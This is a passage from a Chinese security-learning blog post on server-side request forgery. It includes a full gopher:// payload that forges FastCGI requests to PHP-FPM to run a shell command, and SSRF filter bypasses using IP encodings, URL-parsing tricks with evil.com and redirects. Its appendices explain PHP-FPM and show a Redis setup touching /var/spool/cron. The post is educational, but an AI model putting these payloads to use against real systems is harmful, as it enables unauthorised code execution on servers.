class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>payload在利用时需要再次进行url编码。</p>
+<h2 id="绕过方式">绕过方式</h2>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/135342.html">https://www.freebuf.com/articles/web/135342.html</a></p>
+<p>总的来说有以下几种方式：</p>
+<h3 id="IP地址进制转换">IP地址进制转换</h3>
+<p>例如192.168.0.1这个IP地址我们可以改写成：</p>
+<blockquote>
+<p>(1)、8进制格式：0300.0250.0.1</p>
+<p>(2)、16进制格式：0xC0.0xA8.0.1</p>
+<p>(3)、10进制整数格式：3232235521</p>
+<p>(4)、16进制整数格式：0xC0A80001</p>
+</blockquote>
+<h3 id="利用解析URL所出现的问题">利用解析URL所出现的问题</h3>
+<p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com@192.168.0.1&#x2F;</span><br></pre></td></tr></table></figure>
+<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是\<a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，<a target="_blank" rel="noopener" href="http://xn--URLhostwww-xx2pha710a1tzo64bgdzac98cwnybok4bqpa697o.baidu.com">很有可能会认为访问URL的host为www.baidu.com</a>，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p>
+<h3 id="filter-var-bypass">filter_var() bypass</h3>
+<p>看到很多大佬的文章都有提到，找到<a target="_blank" rel="noopener" href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">原文链接</a></p>
+<p><strong>示例代码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">   echo &quot;Argument: &quot;.$url.&quot;\n&quot;;</span><br><span class="line">   if(filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      $r &#x3D; parse_url($url);</span><br><span class="line">      var_dump($r);</span><br><span class="line">      if(preg_match(&#39;&#x2F;google\.com$&#x2F;&#39;, $r[&#39;host&#39;])) </span><br><span class="line">      &#123;</span><br><span class="line">         exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br><span class="line">mixed filter_var ( mixed $variable [, int $filter &#x3D; FILTER_DEFAULT [, mixed $options ]] )函数有两种参数。</span><br><span class="line">FILTER_VALIDATE_EMAIL 检查是否为有效邮箱</span><br><span class="line">FILTER_VALIDATE_URL 检查是否为有效url</span><br></pre></td></tr></table></figure>
+<p>代码的逻辑是先判断，url是否符合逻辑，符合则用<code>preg_match</code>来匹配，匹配成功就curl</p>
+<p>绕过方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:80,google.com:80&#x2F;</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:23333;google.com:80&#x2F;</span><br></pre></td></tr></table></figure>
+<p>利用，或者；可以绕过。</p>
+<h3 id="利用302跳转">利用302跳转</h3>
+<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。</p>
+<p>(1)、在网络上存在一个很神奇的服务，<a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io</a> 当我们访问这个网站的子域名的时候，<a target="_blank" rel="noopener" href="http://xn--192-uc0ep96b.168.0.1.xip.io">例如192.168.0.1.xip.io</a>，就会自动重定向到192.168.0.1。</p>
+<p>(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是<a target="_blank" rel="noopener" href="http://tinyurl.com/">http://tinyurl.com</a>所提供的短地址服务。（现在这个网站已经关闭了）</p>
+<h2 id="Appendix-A">Appendix A</h2>
+<h3 id="PHP的连接方式">PHP的连接方式</h3>
+<p>所谓的连接方式指的就是服务器中间件与某个语言后端进行数据交换的方式。在这里具体而言就是PHP语言和Apache或者Nginx进行数据传输的方式。一共有三种apache2-module、CGI、FastCGI：</p>
+<h4 id="apache2-module模式">apache2-module模式</h4>
+<p>把 php 当做 apache 的一个模块，实际上 php 就相当于 apache 中的一个 dll 或一个 so 文件，phpstudy 的非 nts 模式就是默认以 module 方式连接的。</p>
+<h4 id="CGI模式">CGI模式</h4>
+<p>此时 php 是一个独立的进程比如 php-cgi.exe，web 服务器也是一个独立的进程比如 apache.exe，然后当 Web 服务器监听到 HTTP 请求时，会去调用 php-cgi 进程，他们之间通过 cgi 协议，服务器把请求内容转换成 php-cgi 能读懂的协议数据传递给 cgi 进程，cgi 进程拿到内容就会去解析对应 php 文件，得到的返回结果在返回给 web 服务器，最后 web 服务器返回到客户端，但随着网络技术的发展，CGI 方式的缺点也越来越突出。每次客户端请求都需要建立和销毁进程。因为 HTTP 要生成一个动态页面，系统就必须启动一个新的进程以运行 CGI 程序，不断地 fork 是一项很消耗时间和资源的工作。</p>
+<h4 id="FastCGI模式">FastCGI模式</h4>
+<p>fastcgi 本身还是一个协议，在 cgi 协议上进行了一些优化。众所周知，CGI 进程的反复加载是 CGI 性能低下的主要原因，如果 CGI 解释器保持在内存中 并接受FastCGI 进程管理器调度，则可以提供良好的性能、伸缩性、Fail-Over 特性等等。</p>
+<p>简而言之，CGI 模式是 apache2 接收到请求去调用 CGI 程序，而 fastcgi 模式是 fastcgi 进程自己管理自己的 cgi 进程，而不再是 apache 去主动调用 php-cgi，而 fastcgi 进程又提供了很多辅助功能比如内存管理，垃圾处理，保障了 cgi 的高效性，并且 CGI 此时是常驻在内存中，不会每次请求重新启动。</p>
+<p>在接触不到服务器文件的情况下，我们可以通过<code>phpinfo()</code>中的<code>Server API</code>来判断PHP的连接方式：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191209225549.png" alt=""></p>
+<p>对于FastCGI协议的具体分析参考P牛的博客：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+<h3 id="PHP-FPM">PHP-FPM</h3>
+<h4 id="基本概念">基本概念</h4>
+<p>官方定义如下：</p>
+<blockquote>
+<p>FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</p>
+</blockquote>
+<p>简单地说，FPM是实现和管理FastCGI进程的管理器，能够接收服务器中间件发送的FastCGI协议包并进行解析、最后将解析结果返回给服务器中间件。</p>
+<p>这里借用先知的一个图来看看就清楚了：</p>
+<p><img src="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/1.png" alt="img"></p>
+<h4 id="通信方式">通信方式</h4>
+<p>在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种：</p>
+<h5 id="TCP模式">TCP模式</h5>
+<p>TCP模式即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析。</p>
+<p>通常我们可以通过查看Nginx的配置文件default.conf来确认是否是TCP模式，这里个人环境中的路径为<code>/etc/nginx/conf.d/default.conf</code>，关注fastcgi_pass这一项，若为ip+port的形式即为TCP模式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;      </span><br><span class="line">	index index.php index.html index.htm;      </span><br><span class="line">	include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params;      </span><br><span class="line">	fastcgi_pass 127.0.0.1:9000;      </span><br><span class="line">	fastcgi_index index.php;      </span><br><span class="line">	include fastcgi_params; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在PHP-FPM中，可以通过查看其配置文件，个人环境中的路径为<code>/etc/php/7.2/fpm/pool.d/www.conf</code>，看到listen一项若为ip+port的形式即为TCP模式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; The address on which to accept FastCGI requests.</span><br><span class="line">; Valid syntaxes are:</span><br><span class="line">;   &#39;ip.add.re.ss:port&#39;    - to listen on a TCP socket to a specific IPv4 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#39;port&#39;                 - to listen on a TCP socket to all addresses;                            (IPv6 and IPv4-mapped) on a specific port;</span><br><span class="line">;   &#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39; - to listen on a unix socket.</span><br><span class="line">; Note: This value is mandatory.</span><br><span class="line">listen &#x3D; 127.0.0.1:9000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="Unix-Socket模式">Unix Socket模式</h5>
+<p>Unix套接字模式是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。</p>
+<p>相比之下，Unix套接字模式的性能会优于TCP模式。</p>
+<p>还是一样的识别方法，在Nginx的default.conf中查看fastcgi_pass：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location~\.php$&#123;      </span><br><span class="line">	index index.php index.html index.htm;      </span><br><span class="line">	include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params;      </span><br><span class="line">	fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock;      </span><br><span class="line">	fastcgi_index index.php;      </span><br><span class="line">	include fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在PHP-FPM的www.conf中查看listen：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listen &#x3D; &#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Appendix-B">Appendix B</h2>
+<h3 id="Redis-环境搭建">Redis 环境搭建</h3>
+<ol>
+<li>
+<p>目标机上安装redis服务：<code>apt-get install redis</code></p>
+</li>
+<li>
+<p>如果要使外网访问：</p>
+<p>更改/etc/redis/redis.conf配置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 取消绑定IP</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">bind</span> 127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许后台运行</span></span><br><span class="line">daemonize yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 取消保护模式</span></span><br><span class="line">protected-mode no</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>更改防火墙配置：</p>
+<p>Ubuntu18.04：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ufw allow 6379</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Centos7：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 列出所有开放端口</span></span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将6397端口加入防火墙</span></span><br><span class="line">firewall-cmd --zone=public --add-port=6397/tcp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启防火墙服务</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看是否生效</span></span><br><span class="line">firewall-cmd --zone=public --query-port=6397/tcp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>重启redis服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart redis</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>测试远程是否能够访问：</p>
+<p>查看端口是否开放：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ca01h:~<span class="comment"># nmap 47.97.199.89 -p 6379</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 12:55 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 47.97.199.89</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  redis</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.31 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>查看是否能远程连接目标服务器的redis服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ca01h:~<span class="comment"># redis-cli -h 47.97.199.89 -p 6379</span></span><br><span class="line">47.97.199.89:6379 &gt; info</span><br><span class="line">&gt; (返回redis基本信息)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>配置完成。</p>
+</li>
+</ol>
+<h3 id="PHP-FPM-环境搭建">PHP-FPM 环境搭建</h3>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5598#toc-2">https://xz.aliyun.com/t/5598#toc-2</a></p>
+<h3 id="Nginx-PHP-FPM-502错误排查">Nginx+PHP-FPM 502错误排查</h3>
+<p><a target="_blank" rel="noopener" href="https://www.datadoghq.com/blog/nginx-502-bad-gateway-errors-php-fpm/%E3%80%81">https://www.datadoghq.com/blog/nginx-502-bad-gateway-errors-php-fpm/、</a></p>
+<h3 id="更改Redis的dir属性显示权限不足">更改Redis的dir属性显示权限不足</h3>
+<p>运行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># redis-cli </span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">(error) ERR Changing directory: Permission denied</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>此时redis服务是以非root身份启动：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># ps aux |grep redis</span></span><br><span class="line">redis     3849  0.0  0.3 142960  5804 ?        Ssl  13:24   0:00 /usr/bin/redis-server *:6379</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>解决办法：</p>
+<p>可以以root用户使用<code>redis-server</code>命令启动redis服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]# redis-server &#x2F;etc&#x2F;redis.conf</span><br><span class="line">[root@ca0y1h-centos ~]# ps aux | grep redis</span><br><span class="line">root      3856  0.0  0.2  22132  5168 pts&#x2F;1    S+   13:24   0:00 redis-cli</span><br><span class="line">root      4245  0.0  0.2 142960  5312 ?        Ssl  13:28   0:00 redis-server *:6379</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Reference">Reference</h2>
+<p><a target="_blank" rel="noopener" href="https://joychou.org/web/phpssrf.html#directory0470238852615231466">https://joychou.org/web/phpssrf.html#directory0470238852615231466</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.evi1.cn/post/ssrf/">https://www.evi1.cn/post/ssrf/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/135342.html">https://www.freebuf.com/articles/web/135342.html</a></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2019-12-17</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>-><a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/ssrf/" rel="tag">#ssrf</a> <a class="tag-none-link" href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" rel="tag">#web安全基础</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
